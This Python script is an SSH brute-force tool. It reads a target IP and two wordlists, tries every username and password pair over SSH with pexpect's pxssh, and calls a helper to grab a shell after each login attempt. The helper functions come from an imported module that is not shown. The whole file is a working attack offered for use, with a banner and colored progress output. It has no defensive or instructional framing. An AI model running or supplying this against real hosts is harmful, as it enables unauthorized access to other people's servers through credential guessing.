#!/usr/bin/python3

from pexpect import pxssh
import argparse
import time

from ssh_connect import *


def main_b():
	parser = argparse.ArgumentParser()
	parser.add_argument("ip", help="Specify Target ip")
	parser.add_argument("file1", help="Specify Wordlist")
	parser.add_argument("file2", help="Specify Wordlist")

	args = parser.parse_args()

	if args.ip and args.file1 and args.file2:
		with open(args.file1, 'r') as lines1:

			startTime = time.time()

			for line in lines1: # reading a line from lines in file
				user = line.strip("\r\n")

				with open(args.file2, 'r') as lines2:
					for line in lines2:
						passwd = line.strip("\r\n")

						print(color_obj.WHITE+"[*] Testing: ", str(user)+":"+str(passwd)+color_obj.ENDC)

						conn = connect(args.ip, user, passwd) # ssh connect


						# Getting shell after connecting to ssh 
						shell_getting(user, args.ip, conn, startTime)


	else:
			print(parser.usage)
			exit(0)

banner()

if __name__ == '__main__':
	
	main_b()

